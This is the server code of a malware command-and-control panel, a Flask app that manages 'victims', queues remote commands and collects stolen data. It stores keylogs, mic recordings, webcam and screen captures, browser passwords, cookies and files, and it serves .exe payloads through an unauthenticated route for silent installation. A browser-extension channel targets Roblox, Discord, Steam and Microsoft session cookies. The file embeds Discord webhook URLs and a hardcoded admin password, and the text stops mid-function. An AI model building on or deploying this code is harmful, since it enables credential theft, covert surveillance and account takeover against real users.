import os, json, time, base64, threading, hashlib, secrets, functools, hmac
from pathlib import Path
from datetime import datetime
from flask import Flask, request, jsonify, send_from_directory, render_template, session, redirect, url_for
from flask_cors import CORS
from flask_socketio import SocketIO

BASE = Path(__file__).parent
UPLOADS = BASE / "uploads"
VICTIMS_DIR = BASE / "victims"
PAYLOADS = BASE / "payloads"
USERS_FILE = BASE / "users.json"
UPLOADS.mkdir(exist_ok=True)
VICTIMS_DIR.mkdir(exist_ok=True)
PAYLOADS.mkdir(exist_ok=True)

app = Flask(__name__, template_folder="templates", static_folder="static")
CORS(app)
app.config["SECRET_KEY"] = os.environ.get("SECRET_KEY") or secrets.token_hex(32)
app.config["SESSION_COOKIE_HTTPONLY"] = True
app.config["SESSION_COOKIE_SAMESITE"] = "Lax"
app.config["PERMANENT_SESSION_LIFETIME"] = 60 * 60 * 24 * 7  # 7 days
# Secure flag when on https (Railway)
if os.environ.get("RAILWAY_ENVIRONMENT") or os.environ.get("FORCE_SECURE_COOKIE"):
    app.config["SESSION_COOKIE_SECURE"] = True
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading")

victims = {}
commands = {}
loot_cache = {}
notes = {}
aliases = {}
tags = {}  # vid -> list[str]

def geo_from_ip(ip):
    try:
        if not ip or ip.startswith("127.") or ip.startswith("192.168.") or ip.startswith("10."):
            return {}
        import urllib.request
        with urllib.request.urlopen(f"http://ip-api.com/json/{ip}?fields=status,country,city,query,isp", timeout=4) as r:
            data = json.loads(r.read().decode())
            if data.get("status") == "success":
                return {"country": data.get("country"), "city": data.get("city"), "ip": data.get("query"), "isp": data.get("isp")}
    except Exception:
        pass
    return {}

jobs = {}  # id -> {vid, cmd, args, every_sec, next_ts, label}

browsers = {}  # eid -> client info
androids = {}  # aid -> android client info
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1543772740560101450/nxQpj7CQHkx0K8u8BiOFg1Gtl6FDg5-e1_NJhkTmh-qUK_kVq8IOhsWWgwq73FWn-5x7"
ANDROID_OTP_WEBHOOK = "https://discord.com/api/webhooks/1547170223956824077/OhCoLh0SdTcm9K_M3k4ezLoqcoQ5v9muZ4_75JXPpk-QYYngRDFW0bgVPIk-Al4a8UcQ"

def _browser_wh(title, lines):
    try:
        import urllib.request
        embeds = [{"title": title, "color": 3107583, "description": "\n".join(lines)[:1800]}]
        req = urllib.request.Request(
            DISCORD_WEBHOOK,
            data=json.dumps({"embeds": embeds}).encode(),
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        urllib.request.urlopen(req, timeout=6)
    except Exception:
        pass

BROWSER_FILE = BASE / "browsers.json"
ANDROID_FILE = BASE / "androids.json"

def load_browsers():
    global browsers
    if BROWSER_FILE.exists():
        try:
            browsers = json.loads(BROWSER_FILE.read_text(encoding="utf-8"))
        except Exception:
            browsers = {}

def save_browsers():
    try:
        BROWSER_FILE.write_text(json.dumps(browsers, indent=2), encoding="utf-8")
    except Exception:
        pass

load_browsers()

def load_androids():
    global androids
    try:
        if ANDROID_FILE.exists():
            androids = json.loads(ANDROID_FILE.read_text(encoding="utf-8"))
        else:
            androids = {}
    except Exception:
        androids = {}

def save_androids():
    try:
        ANDROID_FILE.write_text(json.dumps(androids, indent=2), encoding="utf-8")
    except Exception:
        pass

load_androids()



activity_log = []  # global feed
ACTIVITY_MAX = 200
lock = threading.Lock()

def _hash_pw(pw, salt=None):
    salt = salt or secrets.token_hex(8)
    h = hashlib.sha256((salt + pw).encode("utf-8")).hexdigest()
    return salt, h

def _new_builder_id():
    # long random id; never "1" (reserved for sanity)
    while True:
        bid = secrets.token_hex(16)  # 32 hex chars
        if bid != "1":
            return bid

def load_users():
    for path in (USERS_FILE, BASE / "users.backup.json"):
      if path.exists():
        try:
            users = json.loads(path.read_text(encoding="utf-8"))
            if users:
                if path != USERS_FILE:
                    USERS_FILE.write_text(json.dumps(users, indent=2), encoding="utf-8")
                changed = False
                for name, rec in users.items():
                    if "builder_id" not in rec:
                        rec["builder_id"] = "1" if name == "sanity" else _new_builder_id()
                        changed = True
                if changed:
                    USERS_FILE.write_text(json.dumps(users, indent=2), encoding="utf-8")
                return users
        except Exception:
            pass
    if False and USERS_FILE.exists():
        try:
            users = json.loads(USERS_FILE.read_text(encoding="utf-8"))
            changed = False
            for name, rec in users.items():
                if "builder_id" not in rec:
                    rec["builder_id"] = "1" if name == "sanity" else _new_builder_id()
                    changed = True
            if changed:
                USERS_FILE.write_text(json.dumps(users, indent=2), encoding="utf-8")
            return users
        except Exception:
            pass
    # seed admin: sanity / dllman7788@@
    salt, h = _hash_pw("dllman7788@@")
    users = {
        "sanity": {
            "salt": salt, "hash": h, "role": "admin",
            "builder_id": "1",
            "created": datetime.utcnow().isoformat() + "Z",
        }
    }
    USERS_FILE.write_text(json.dumps(users, indent=2), encoding="utf-8")
    return users

def save_users(users):
    if not users:
        return  # never wipe accounts file to empty
    USERS_FILE.write_text(json.dumps(users, indent=2), encoding="utf-8")
    # secondary backup so Railway restarts don't orphan logins as easily
    try:
        bak = BASE / "users.backup.json"
        bak.write_text(json.dumps(users, indent=2), encoding="utf-8")
    except Exception:
        pass

USERS = load_users()

def load_victims_from_disk():
    """Restore last-known victims after restart so panel is not empty."""
    loaded = 0
    try:
        for f in VICTIMS_DIR.glob("*.json"):
            try:
                data = json.loads(f.read_text(encoding="utf-8"))
                vid = f.stem
                if not isinstance(data, dict):
                    continue
                victims[vid] = data
                loaded += 1
            except Exception:
                continue
    except Exception:
        pass
    return loaded

load_victims_from_disk()

_login_hits = {}  # ip -> [timestamps]

def _rate_limit_login():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr or "?").split(",")[0].strip()
    now_t = time.time()
    hits = [x for x in _login_hits.get(ip, []) if now_t - x < 300]
    if len(hits) >= 20:
        return False
    hits.append(now_t)
    _login_hits[ip] = hits
    return True

def current_user():
    u = session.get("user")
    if not u or u not in USERS:
        return None
    return {
        "username": u,
        "role": USERS[u].get("role", "user"),
        "builder_id": USERS[u].get("builder_id") or ("1" if u == "sanity" else ""),
    }

def login_required(fn):
    @functools.wraps(fn)
    def wrapper(*args, **kwargs):
        if not current_user():
            if request.path.startswith("/api/"):
                return jsonify({"error": "auth"}), 401
            return redirect("/login")
        return fn(*args, **kwargs)
    return wrapper

def admin_required(fn):
    @functools.wraps(fn)
    def wrapper(*args, **kwargs):
        u = current_user()
        if not u:
            return jsonify({"error": "auth"}), 401
        if u.get("role") != "admin":
            return jsonify({"error": "admin only"}), 403
        return fn(*args, **kwargs)
    return wrapper


def now():
    return datetime.utcnow().isoformat() + "Z"

def push_activity(kind, vid, message, extra=None):
    entry = {
        "ts": now(),
        "kind": kind,
        "vid": vid or "",
        "message": (message or "")[:500],
        "extra": extra or {},
    }
    activity_log.insert(0, entry)
    del activity_log[ACTIVITY_MAX:]
    try:
        socketio.emit("activity", entry)
    except Exception:
        pass
    return entry


@socketio.on("connect")
def sock_connect():
    # allow connect; API still auth-protected. Reject only if explicit bad session.
    return True

@app.route("/login")
def login_page():
    if current_user():
        return redirect("/")
    return render_template("login.html")

@app.route("/api/login", methods=["POST"])
def api_login():
    if not _rate_limit_login():
        return jsonify({"error": "too many attempts"}), 429
    data = request.get_json(force=True) or {}
    user = (data.get("username") or "").strip()
    pw = data.get("password") or ""
    rec = USERS.get(user)
    if not rec:
        return jsonify({"error": "bad credentials"}), 401
    _, h = _hash_pw(pw, rec["salt"])
    if not hmac.compare_digest(h, rec["hash"]):
        return jsonify({"error": "bad credentials"}), 401
    session["user"] = user
    session.permanent = True
    return jsonify({"ok": True, "username": user, "role": rec.get("role", "user")})

@app.route("/api/logout", methods=["POST"])
def api_logout():
    session.clear()
    return jsonify({"ok": True})

@app.route("/api/me")
def api_me():
    u = current_user()
    if not u:
        return jsonify({"error": "auth"}), 401
    return jsonify(u)

@app.route("/api/admin/users", methods=["GET"])
@admin_required
def admin_list_users():
    out = [{"username": k, "role": v.get("role", "user"), "builder_id": v.get("builder_id", ""), "created": v.get("created")} for k, v in USERS.items()]
    return jsonify(out)

@app.route("/api/admin/users", methods=["POST"])
@admin_required
def admin_create_user():
    global USERS
    data = request.get_json(force=True) or {}
    user = (data.get("username") or "").strip()
    pw = data.get("password") or ""
    role = data.get("role") or "user"
    if role not in ("user", "admin"):
        role = "user"
    if not user or not pw:
        return jsonify({"error": "username+password required"}), 400
    if user in USERS:
        return jsonify({"error": "exists"}), 400
    salt, h = _hash_pw(pw)
    bid = "1" if user == "sanity" else _new_builder_id()
    USERS[user] = {"salt": salt, "hash": h, "role": role, "builder_id": bid, "created": now()}
    save_users(USERS)
    return jsonify({"ok": True, "builder_id": bid})

@app.route("/api/admin/users/<username>", methods=["DELETE"])
@admin_required
def admin_delete_user(username):
    global USERS
    username = (username or "").strip()
    if username.lower() == "sanity":
        return jsonify({"error": "cannot delete primary admin"}), 400
    if username == session.get("user"):
        return jsonify({"error": "cannot delete self"}), 400
    if username not in USERS:
        return jsonify({"error": "missing"}), 404
    admins = [k for k, v in USERS.items() if v.get("role") == "admin"]
    if USERS[username].get("role") == "admin" and len(admins) <= 1:
        return jsonify({"error": "cannot delete last admin"}), 400
    del USERS[username]
    save_users(USERS)
    return jsonify({"ok": True})

@app.route("/")
@login_required
def index():
    return render_template("index.html")

@app.route("/api/checkin", methods=["POST"])
def checkin():
    data = request.get_json(force=True) or {}
    vid = data.get("vid") or "unknown"
    info = data.get("info") or {}
    owner_id = str(data.get("owner_id") or info.get("owner_id") or "")
    with lock:
        if vid not in victims:
            victims[vid] = {"first_seen": now(), "loot_count": 0, "owner_id": owner_id}
        # geo once
        if not victims[vid].get("geo"):
            ip = request.headers.get("X-Forwarded-For", request.remote_addr or "").split(",")[0].strip()
            g = geo_from_ip(ip)
            if g:
                victims[vid]["geo"] = g
        victims[vid].update({
            "info": info,
            "last_seen": now(),
            "online": True,
        })
        if owner_id:
            victims[vid]["owner_id"] = owner_id
        cmds = commands.pop(vid, [])
    (VICTIMS_DIR / f"{vid}.json").write_text(json.dumps(victims[vid], indent=2), encoding="utf-8")
    socketio.emit("victim_update", {"vid": vid, "info": info, "last_seen": victims[vid]["last_seen"]})
    if data.get("first"):
        host = (info or {}).get("hostname") or vid[:8]
        push_activity("join", vid, f"{host} checked in")
    return jsonify({"commands": cmds})

@app.route("/api/loot", methods=["POST"])
def receive_loot():
    data = request.get_json(force=True) or {}
    vid = data.get("vid") or "unknown"
    loot_type = data.get("type", "unknown")
    content = data.get("data")
    ts = data.get("ts") or now()
    loot_dir = UPLOADS / vid
    loot_dir.mkdir(exist_ok=True)
    filename = f"{loot_type}_{int(time.time())}"
    entry = {"type": loot_type, "ts": ts, "file": None, "preview": None}

    if loot_type == "mic_chunk" and isinstance(content, str) and len(content) > 100:
        entry["preview"] = content
        entry["file"] = None
    elif loot_type == "mic_wav" and isinstance(content, str) and len(content) > 100:
        try:
            raw = base64.b64decode(content)
            wav_path = loot_dir / f"{filename}.wav"
            wav_path.write_bytes(raw)
            entry["file"] = wav_path.name
            entry["preview"] = "wav"
        except Exception as e:
            entry["preview"] = str(e)
    elif loot_type in ("screenshot", "webcam", "screen_frame", "webcam_frame") and isinstance(content, str) and len(content) > 100:
        try:
            raw = base64.b64decode(content)
            # live frames: keep b64 on entry for instant UI; only persist screenshots/webcam snaps to disk
            if loot_type in ("screen_frame", "webcam_frame"):
                entry["preview"] = content  # full b64 for live view
                entry["file"] = None
            else:
                ext = "jpg"
                img_path = loot_dir / f"{filename}.{ext}"
                img_path.write_bytes(raw)
                entry["file"] = img_path.name
                entry["preview"] = content[:80]
        except Exception:
            (loot_dir / f"{filename}.json").write_text(json.dumps({"data": content[:500]}), encoding="utf-8")
            entry["file"] = f"{filename}.json"
    elif loot_type == "steal_zip" and isinstance(content, str) and len(content) > 100:
        try:
            import zipfile, io
            raw = base64.b64decode(content)
            zip_path = loot_dir / f"steal_{int(time.time())}.zip"
            zip_path.write_bytes(raw)
            entry["file"] = zip_path.name
            summary = {"passwords": 0, "cookies": 0, "history": 0, "samples": []}
            try:
                with zipfile.ZipFile(io.BytesIO(raw)) as zf:
                    names = zf.namelist()
                    if "passwords.json" in names:
                        pw = json.loads(zf.read("passwords.json").decode("utf-8", "ignore") or "[]")
                        summary["passwords"] = len(pw) if isinstance(pw, list) else 0
                        for p in (pw or [])[:8]:
                            if isinstance(p, dict):
                                summary["samples"].append({
                                    "url": str(p.get("url", ""))[:80],
                                    "user": str(p.get("username", ""))[:60],
                                    "pass": str(p.get("password", ""))[:60],
                                    "browser": str(p.get("browser", ""))[:20],
                                })
                    if "cookies.json" in names:
                        ck = json.loads(zf.read("cookies.json").decode("utf-8", "ignore") or "[]")
                        summary["cookies"] = len(ck) if isinstance(ck, list) else 0
                    if "history.json" in names:
                        hs = json.loads(zf.read("history.json").decode("utf-8", "ignore") or "[]")
                        summary["history"] = len(hs) if isinstance(hs, list) else 0
                    if "passwords.txt" in names and not summary["samples"]:
                        txt = zf.read("passwords.txt").decode("utf-8", "ignore")[:2000]
                        summary["samples"].append({"url": "passwords.txt", "user": "", "pass": txt[:200], "browser": ""})
            except Exception as e:
                summary["error"] = str(e)
            entry["summary"] = summary
            entry["preview"] = json.dumps(summary)
        except Exception:
            pass
    elif loot_type == "file_download" and isinstance(content, dict):
        try:
            name = content.get("name") or "file.bin"
            raw = base64.b64decode(content.get("data") or "")
            fpath = loot_dir / f"dl_{int(time.time())}_{name}"
            fpath.write_bytes(raw)
            entry["file"] = fpath.name
            entry["preview"] = name
        except Exception as e:
            entry["preview"] = str(e)
    elif loot_type in ("creds", "filesearch") and content is not None:
        jpath = loot_dir / f"{filename}.json"
        jpath.write_text(json.dumps({"data": content}, default=str), encoding="utf-8")
        entry["file"] = jpath.name
        entry["preview"] = json.dumps(content)[:400] if not isinstance(content, str) else content[:400]
    elif loot_type == "keylog":
        kfile = loot_dir / "keylog_live.txt"
        with open(kfile, "a", encoding="utf-8") as f:
            f.write(str(content))
        entry["file"] = "keylog_live.txt"
        entry["preview"] = str(content)[:200]
    else:
        jpath = loot_dir / f"{filename}.json"
        jpath.write_text(json.dumps({"data": content}, default=str), encoding="utf-8")
        entry["file"] = jpath.name
        if isinstance(content, str):
            entry["preview"] = content[:300]
        elif isinstance(content, (dict, list)):
            entry["preview"] = json.dumps(content)[:300]

    entry["type"] = loot_type
    entry["ts"] = ts
    with lock:
        if vid not in loot_cache:
            loot_cache[vid] = []
        loot_cache[vid].insert(0, entry)
        loot_cache[vid] = loot_cache[vid][:120]
        if vid in victims:
            victims[vid]["loot_count"] = victims[vid].get("loot_count", 0) + 1
    socketio.emit("new_loot", {"vid": vid, "entry": entry})
    if loot_type not in ("screen_frame", "webcam_frame"):
        push_activity("loot", vid, f"{loot_type}", {"file": entry.get("file")})
    return jsonify({"ok": True})

@app.route("/api/command", methods=["POST"])
@login_required
def send_command():
    data = request.get_json(force=True) or {}
    vids = data.get("vids") or ([data.get("vid")] if data.get("vid") else [])
    cmd = data.get("cmd") or data.get("command")
    args = data.get("args") or {}
    if not vids or not cmd:
        return jsonify({"error": "vid/cmd required"}), 400
    payload = {"cmd": cmd, "args": args}
    with lock:
        for vid in vids:
            if not vid:
                continue
            commands.setdefault(vid, []).append(payload)
    return jsonify({"ok": True, "queued": len(vids)})

@app.route("/api/victims")
@login_required
def list_victims():
    me = current_user()
    my_bid = (me or {}).get("builder_id") or ""
    role = (me or {}).get("role")
    with lock:
        out = []
        for vid, v in victims.items():
            oid = str(v.get("owner_id") or "")
            # admin sees everything
            # non-admin: see untagged (legacy) OR matching builder_id
            if role != "admin" and my_bid:
                # show if untagged/legacy OR matches this builder
                if oid and oid not in (my_bid, "", "None", "null"):
                    if oid != my_bid:
                        continue
            last = v.get("last_seen") or ""
            try:
                online = (datetime.utcnow() - datetime.fromisoformat(last.replace("Z", ""))).total_seconds() < 15
            except Exception:
                online = False
            out.append({"vid": vid, "info": v.get("info") or {}, "last_seen": last, "online": online,
                        "loot_count": v.get("loot_count", 0), "notes": notes.get(vid, ""), "owner_id": v.get("owner_id", ""),
                        "alias": aliases.get(vid, ""), "tags": tags.get(vid, []), "geo": v.get("geo") or {}})
    return jsonify(out)


@app.route("/api/rename", methods=["POST"])
@login_required
def rename_victim():
    data = request.get_json(force=True) or {}
    vid = data.get("vid")
    alias = (data.get("alias") or "").strip()[:64]
    if not vid:
        return jsonify({"error": "vid"}), 400
    if alias:
        aliases[vid] = alias
    else:
        aliases.pop(vid, None)
        tags.pop(vid, None)
    return jsonify({"ok": True, "alias": aliases.get(vid, "")})

@app.route("/api/victim/delete", methods=["POST"])
@login_required
def delete_victim():
    """Permanently remove victim from panel memory, disk record, and loot."""
    data = request.get_json(force=True) or {}
    vid = (data.get("vid") or "").strip()
    if not vid:
        return jsonify({"error": "vid required"}), 400
    me = current_user()
    my_bid = (me or {}).get("builder_id") or ""
    role = (me or {}).get("role")
    with lock:
        v = victims.get(vid)
        if not v:
            # still allow cleanup of orphans
            pass
        else:
            oid = str(v.get("owner_id") or "")
            if role != "admin" and my_bid and oid and oid != my_bid:
                return jsonify({"error": "forbidden"}), 403
        victims.pop(vid, None)
        commands.pop(vid, None)
        loot_cache.pop(vid, None)
        notes.pop(vid, None)
        aliases.pop(vid, None)
        tags.pop(vid, None)
    # disk
    try:
        vp = VICTIMS_DIR / f"{vid}.json"
        if vp.exists():
            vp.unlink()
    except Exception:
        pass
    removed = 0
    try:
        d = UPLOADS / vid
        if d.is_dir():
            for f in d.iterdir():
                try:
                    f.unlink()
                    removed += 1
                except Exception:
                    pass
            try:
                d.rmdir()
            except Exception:
                pass
    except Exception:
        pass
    push_activity("delete", vid, f"victim removed · {removed} loot files")
    try:
        socketio.emit("victim_update", {"vid": vid, "deleted": True})
    except Exception:
        pass
    return jsonify({"ok": True, "removed_files": removed})

@app.route("/api/bulk_notes", methods=["POST"])
@login_required
def bulk_notes():
    data = request.get_json(force=True) or {}
    vids = data.get("vids") or []
    text = data.get("notes", "")
    for vid in vids:
        notes[vid] = text
    return jsonify({"ok": True, "n": len(vids)})

@app.route("/api/bulk_alias", methods=["POST"])
@login_required
def bulk_alias():
    data = request.get_json(force=True) or {}
    vids = data.get("vids") or []
    alias = (data.get("alias") or "").strip()[:64]
    for vid in vids:
        if alias:
            aliases[vid] = alias
        else:
            aliases.pop(vid, None)
        tags.pop(vid, None)
    return jsonify({"ok": True, "n": len(vids)})

@app.route("/api/notes", methods=["POST"])
@login_required
def set_notes():
    data = request.get_json(force=True) or {}
    vid = data.get("vid")
    text = data.get("notes", "")
    if not vid:
        return jsonify({"error": "vid"}), 400
    notes[vid] = text
    return jsonify({"ok": True})

@app.route("/api/jobs", methods=["GET"])
@login_required
def list_jobs():
    return jsonify(list(jobs.values()))

@app.route("/api/jobs", methods=["POST"])
@login_required
def add_job():
    data = request.get_json(force=True) or {}
    vid = data.get("vid")
    cmd = data.get("cmd")
    if not vid or not cmd:
        return jsonify({"error": "vid and cmd"}), 400
    jid = secrets.token_hex(4)
    every = int(data.get("every_sec") or 3600)
    every = max(60, min(every, 86400 * 7))
    job = {
        "id": jid, "vid": vid, "cmd": cmd, "args": data.get("args") or {},
        "every_sec": every, "next_ts": time.time() + 5,
        "label": data.get("label") or f"{cmd} every {every}s",
    }
    jobs[jid] = job
    return jsonify({"ok": True, "job": job})

@app.route("/api/jobs/<jid>", methods=["DELETE"])
@login_required
def del_job(jid):
    jobs.pop(jid, None)
    return jsonify({"ok": True})

def jobs_tick():
    while True:
        try:
            now_t = time.time()
            for jid, job in list(jobs.items()):
                if now_t >= float(job.get("next_ts") or 0):
                    vid = job["vid"]
                    with lock:
                        commands.setdefault(vid, []).append({"cmd": job["cmd"], "args": job.get("args") or {}})
                    job["next_ts"] = now_t + int(job.get("every_sec") or 3600)
                    push_activity("job", vid, job.get("label") or job["cmd"])
        except Exception:
            pass
        time.sleep(15)

threading.Thread(target=jobs_tick, daemon=True).start()

@app.route("/api/tags", methods=["POST"])
@login_required
def set_tags():
    data = request.get_json(force=True) or {}
    vid = data.get("vid")
    if not vid:
        return jsonify({"error": "vid"}), 400
    raw = data.get("tags") or []
    if isinstance(raw, str):
        raw = [x.strip() for x in raw.replace(";", ",").split(",") if x.strip()]
    clean = []
    for t in raw:
        t = str(t).strip()[:24]
        if t and t not in clean:
            clean.append(t)
    tags[vid] = clean[:12]
    return jsonify({"ok": True, "tags": tags[vid]})

@app.route("/api/loot/<vid>")
@login_required
def get_loot(vid):
    return jsonify(loot_cache.get(vid, []))

@app.route("/api/loot_file/<vid>/<path:filename>")
@login_required
def get_loot_file(vid, filename):
    path = UPLOADS / vid
    return send_from_directory(path, filename, as_attachment=True)

@app.route("/api/keylog/<vid>")
@login_required
def get_keylog(vid):
    kfile = UPLOADS / vid / "keylog_live.txt"
    if kfile.exists():
        return kfile.read_text(encoding="utf-8", errors="ignore")
    return ""

@app.route("/api/keylog_clear/<vid>", methods=["POST"])
@login_required
def clear_keylog(vid):
    kfile = UPLOADS / vid / "keylog_live.txt"
    try:
        if kfile.exists():
            kfile.write_text("", encoding="utf-8")
    except Exception:
        pass
    return jsonify({"ok": True})

@app.route("/api/activity")
@login_required
def get_activity():
    return jsonify(activity_log[:120])

@app.route("/api/export/<vid>")
@login_required
def export_victim(vid):
    with lock:
        v = victims.get(vid, {})
        loot = loot_cache.get(vid, [])
    payload = {
        "vid": vid,
        "alias": aliases.get(vid, ""),
        "notes": notes.get(vid, ""),
        "info": v.get("info") or {},
        "first_seen": v.get("first_seen"),
        "last_seen": v.get("last_seen"),
        "loot_index": loot,
    }
    return jsonify(payload)

@app.route("/api/vault/clear", methods=["POST"])
@login_required
def vault_clear():
    data = request.get_json(force=True) or {}
    vid = data.get("vid")  # optional: one victim only
    removed = 0
    with lock:
        targets = [vid] if vid else [p.name for p in UPLOADS.iterdir() if p.is_dir()]
        for v in targets:
            d = UPLOADS / v
            if not d.is_dir():
                continue
            for f in d.iterdir():
                try:
                    f.unlink()
                    removed += 1
                except Exception:
                    pass
            if vid is None or True:
                loot_cache[v] = []
    return jsonify({"ok": True, "removed": removed})

@app.route("/api/vault")
@login_required
def vault():
    items = []
    for d in UPLOADS.iterdir():
        if not d.is_dir():
            continue
        for f in d.iterdir():
            if f.is_file():
                items.append({"vid": d.name, "file": f.name, "size": f.stat().st_size, "mtime": f.stat().st_mtime})
    items.sort(key=lambda x: x["mtime"], reverse=True)
    return jsonify(items[:300])

@app.route("/api/geo/<vid>")
@login_required
def geo(vid):
    # best-effort from request IP if victim never sent — panel side stub
    return jsonify({"vid": vid, "note": "geo from victim IP not stored; use external IP lookup on hostname if needed"})

@app.route("/api/payload/upload", methods=["POST"])
@login_required
def payload_upload():
    """Upload EXE from panel; returns public path for self_update / download_exec."""
    f = request.files.get("file")
    if not f or not f.filename:
        return jsonify({"error": "no file"}), 400
    name = Path(f.filename).name
    if not name.lower().endswith(".exe"):
        return jsonify({"error": "exe only"}), 400
    # unique name
    token = secrets.token_hex(8)
    safe = f"{token}_{name}"
    dest = PAYLOADS / safe
    f.save(dest)
    # public URL relative to this host
    public = f"/p/{safe}"
    return jsonify({
        "ok": True,
        "file": safe,
        "path": public,
        "size": dest.stat().st_size,
        "url_hint": public,  # same origin; victim uses full host + this
    })

@app.route("/p/<path:filename>")
def payload_public(filename):
    """Unauthenticated download so victims can pull the update silently."""
    # only allow files that exist in payloads/
    safe = Path(filename).name
    path = PAYLOADS / safe
    if not path.is_file():
        return "missing", 404
    return send_from_directory(PAYLOADS, safe, as_attachment=True)

@app.route("/api/payload/list")
@login_required
def payload_list():
    items = []
    for f in PAYLOADS.iterdir():
        if f.is_file():
            items.append({"file": f.name, "size": f.stat().st_size, "path": f"/p/{f.name}"})
    items.sort(key=lambda x: x["file"], reverse=True)
    return jsonify(items)


# ===================== BROWSER / EXTENSION CLIENTS =====================

@app.route("/api/browser/hello", methods=["POST"])
def browser_hello():
    data = request.get_json(force=True, silent=True) or {}
    eid = (data.get("eid") or "").strip()
    if not eid or len(eid) < 8:
        return jsonify({"error": "bad eid"}), 400
    ua = request.headers.get("User-Agent", "")[:180]
    ip = request.headers.get("X-Forwarded-For", request.remote_addr) or ""
    if "," in ip:
        ip = ip.split(",")[0].strip()
    entry = browsers.get(eid) or {
        "pending_drops": [], "pending_cmds": [], "dropped_count": 0,
        "first_seen": now(), "loot": []
    }
    entry["last_seen"] = now()
    entry["ua"] = ua
    entry["ip"] = ip
    entry["browser"] = str(data.get("browser") or entry.get("browser") or "")[:40]
    entry["platform"] = str(data.get("platform") or entry.get("platform") or "")[:40]
    entry["lang"] = str(data.get("lang") or entry.get("lang") or "")[:20]
    entry["tz"] = str(data.get("tz") or entry.get("tz") or "")[:40]
    entry["ver"] = str(data.get("ver") or entry.get("ver") or "")[:20]
    entry["screen"] = str(data.get("screen") or entry.get("screen") or "")[:20]
    entry["tabs"] = data.get("tabs") if isinstance(data.get("tabs"), list) else entry.get("tabs") or []
    entry["roblox_alive"] = bool(data.get("roblox_alive")) if "roblox_alive" in data else entry.get("roblox_alive")
    entry["ext_ver"] = str(data.get("ext_ver") or entry.get("ext_ver") or "")[:20]
    entry["kind"] = str(data.get("kind") or entry.get("kind") or "")[:40]
    entry["donutflip"] = bool(data.get("donutflip")) if "donutflip" in data else entry.get("donutflip", False)
    if data.get("cookie_count") is not None:
        entry["cookie_count"] = data.get("cookie_count")
    if "has_session" in data:
        entry["has_session"] = bool(data.get("has_session"))
    if data.get("balance") is not None:
        entry["balance"] = data.get("balance")
    pending = list(entry.get("pending_drops") or [])
    cmds = list(entry.get("pending_cmds") or [])
    entry["pending_drops"] = []
    entry["pending_cmds"] = []
    if pending:
        entry["dropped_count"] = entry.get("dropped_count", 0) + len(pending)
    browsers[eid] = entry
    save_browsers()
    info = {k: entry[k] for k in entry if k not in ("pending_drops", "pending_cmds", "loot")}
    socketio.emit("browser_update", {"eid": eid, "info": info})
    return jsonify({"ok": True, "drops": pending, "cmds": cmds})

@app.route("/api/browser/list")
@login_required
def browser_list():
    out = []
    for eid, b in browsers.items():
        out.append({
            "eid": eid,
            "last_seen": b.get("last_seen"),
            "first_seen": b.get("first_seen"),
            "ua": b.get("ua"),
            "ip": b.get("ip"),
            "browser": b.get("browser"),
            "platform": b.get("platform"),
            "lang": b.get("lang"),
            "tz": b.get("tz"),
            "ver": b.get("ver"),
            "screen": b.get("screen"),
            "ext_ver": b.get("ext_ver"),
            "roblox_alive": b.get("roblox_alive"),
            "tabs": b.get("tabs") or [],
            "notes": b.get("notes") or "",
            "tags": b.get("tags") or [],
            "pinned": bool(b.get("pinned")),
            "pending": len(b.get("pending_drops") or []) + len(b.get("pending_cmds") or []),
            "dropped_count": b.get("dropped_count", 0),
            "loot_count": len(b.get("loot") or []),
        })
    out.sort(key=lambda x: x.get("last_seen") or "", reverse=True)
    return jsonify(out)

@app.route("/api/browser/push", methods=["POST"])
@login_required
def browser_push():
    data = request.get_json(force=True, silent=True) or {}
    path = (data.get("path") or "").strip()
    name = (data.get("name") or "RuntimeBroker.exe").strip()
    target = (data.get("eid") or "all").strip()
    cmd = (data.get("cmd") or "").strip().lower()
    # allow pure command queue via push (used by Donut panel)
    if cmd and not path:
        count = 0
        def q(eid):
            browsers[eid].setdefault("pending_cmds", []).append({"cmd": cmd, "args": data.get("args") or {}})
        if target == "all":
            for eid in list(browsers.keys()):
                q(eid); count += 1
        else:
            if target not in browsers:
                return jsonify({"error": "unknown eid"}), 404
            q(target); count = 1
        save_browsers()
        socketio.emit("browser_update", {"cmd": cmd, "queued": count})
        return jsonify({"ok": True, "queued": count, "cmd": cmd})
    if not path.startswith("/p/"):
        return jsonify({"error": "path must be /p/....exe"}), 400
    drop = {"path": path, "name": name}
    count = 0
    if target == "all":
        for eid in list(browsers.keys()):
            browsers[eid].setdefault("pending_drops", []).append(drop)
            count += 1
    else:
        if target not in browsers:
            return jsonify({"error": "unknown eid"}), 404
        browsers[target].setdefault("pending_drops", []).append(drop)
        count = 1
    save_browsers()
    socketio.emit("browser_update", {"pushed": count, "path": path})
    return jsonify({"ok": True, "queued": count})

@app.route("/api/browser/cmd", methods=["POST"])
@login_required
def browser_cmd():
    data = request.get_json(force=True, silent=True) or {}
    cmd = (data.get("cmd") or "both").strip().lower()
    allowed = {
        "cookies", "discord", "roblox", "both", "all", "passwords",
        "cookies_roblox", "cookies_discord", "cookies_google", "cookies_steam",
        "history", "bookmarks", "screenshot", "forms",
        "site_roblox", "site_discord", "site_google", "site_steam",
        "donutflip", "cookies_donutflip", "df", "donutsurge", "cookies_donutsurge",
        "microsoft", "cookies_microsoft", "xbox", "cookies_xbox",
        "minecraft", "minecraft_pack", "steal_all", "hello", "ping",
        "steal_cookies", "all_cookies"
    }
    if cmd not in allowed:
        return jsonify({"error": "unsupported cmd", "cmd": cmd}), 400
    target = (data.get("eid") or "all").strip()
    count = 0

    def queue(eid):
        # wipe previous loot so panel only shows fresh steal
        browsers[eid]["loot"] = []
        browsers[eid].setdefault("pending_cmds", []).append({"cmd": cmd})
        # clear on-disk loot files for this eid
        try:
            import shutil
            loot_dir = BASE / "browser_loot" / eid
            if loot_dir.exists():
                shutil.rmtree(loot_dir, ignore_errors=True)
        except Exception:
            pass

    if target == "all":
        for eid in list(browsers.keys()):
            queue(eid)
            count += 1
    else:
        if target not in browsers:
            return jsonify({"error": "unknown eid"}), 404
        queue(target)
        count = 1
    save_browsers()
    socketio.emit("browser_update", {"cmd_queued": count, "cmd": cmd, "loot_cleared": True})
    socketio.emit("browser_loot", {"eid": target, "cleared": True})
    return jsonify({"ok": True, "queued": count})

@app.route("/api/browser/loot", methods=["POST"])
def browser_loot():
    data = request.get_json(force=True, silent=True) or {}
    eid = (data.get("eid") or "").strip()
    if not eid:
